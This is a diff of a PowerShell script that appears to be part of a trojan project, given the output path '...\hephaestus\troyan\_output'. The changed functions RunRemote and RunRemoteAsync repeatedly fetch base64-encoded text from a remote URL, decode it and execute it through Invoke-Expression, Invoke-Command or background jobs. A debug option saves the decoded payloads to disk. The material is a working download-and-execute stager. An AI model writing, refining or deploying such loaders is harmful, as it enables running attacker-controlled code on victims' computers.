@@ -197,33 +197,46 @@ function Close-Processes {
     }
 }
 
+function Get-TempPs {
+    # Generate a unique temporary file name in the temp directory
+    $tempFile = [System.IO.Path]::GetTempFileName()
+
+    # Change the file extension to .ps1
+    $ps1TempFile = [System.IO.Path]::ChangeExtension($tempFile, ".ps1")
+
+    return $ps1TempFile
+}
+
 # never change def values
 function RunRemote {
     param (
         [string]$baseUrl,
         [string]$block,
-        [bool]$waitForFinish = $true,
-        [bool]$inJob = $false,
-        [string] $cmd = ""
+        [bool]$isJob = $false,
+        [bool]$isWait = $true
     )
-    if ([string]::IsNullOrEmpty($cmd)) 
-    {
-        $cmd = "do_$block";
-    }
     $url = "$baseUrl$block.txt"
     $timeout = [datetime]::UtcNow.AddMinutes(5)
-    $delay = 5
+    $delay = 10
     Start-Sleep -Seconds $delay
     while ([datetime]::UtcNow -lt $timeout) {
         try {
             $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
             if ($response.StatusCode -eq 200) {
-                $scripData = $response.Content
-                $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData)) + "`n`n" + $cmd
-
-                if ($inJob) {
-                    $generalJob = Start-Job -ScriptBlock { Invoke-Expression $using:scripData }
-                    if ($waitForFinish) {
+                $scriptData = $response.Content
+                $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData))
+                if ($globalDebug)
+                {
+                    try {
+                        Utf8NoBom -data $scriptData -file "C:\Soft\hephaestus\troyan\_output\_temp_$block.ps1"      
+                    }
+                    catch {
+                    }
+                }
+                $codeBlock = [ScriptBlock]::Create($scriptData)
+                if ($isJob) {
+                    $generalJob = Start-Job -ScriptBlock $codeBlock
+                    if ($isWait) {
                         Wait-Job -Job $generalJob -Timeout 300 | Out-Null
                         if ($generalJob.State -eq 'Completed') {
                             $result = Receive-Job -Job $generalJob
@@ -238,7 +251,8 @@ function RunRemote {
                         return
                     }
                 } else {
-                    Invoke-Expression $scripData
+                    $codeBlock = [ScriptBlock]::Create($scriptData)
+                    Invoke-Command -ScriptBlock $codeBlock
                     return
                 }
             }
@@ -253,13 +267,8 @@ function RunRemote {
 function RunRemoteAsync {
     param (
         [string]$baseUrl,
-        [string]$block,
-        [string]$cmd = ""
+        [string]$block
     )
-    if ([string]::IsNullOrEmpty($cmd)) 
-    {
-        $cmd = "do_$block";
-    }
     $url = "$baseUrl/$block.txt"
 
     # Main async job to fetch and process the script data
@@ -278,9 +287,9 @@ function RunRemoteAsync {
                 $response = Invoke-WebRequest -Uri $url -UseBasicParsing -Method Get
                 if ($response.StatusCode -eq 200) {
                     # Decode the base64 content and append command
-                    $scripData = $response.Content
-                    $scripData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scripData)) + "`n`n" + $cmd
-                    Invoke-Expression $scripData
+                    $scriptData = $response.Content
+                    $scriptData = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($scriptData))
+                    Invoke-Expression -Command $scriptData
                     return
                 }
             } catch {
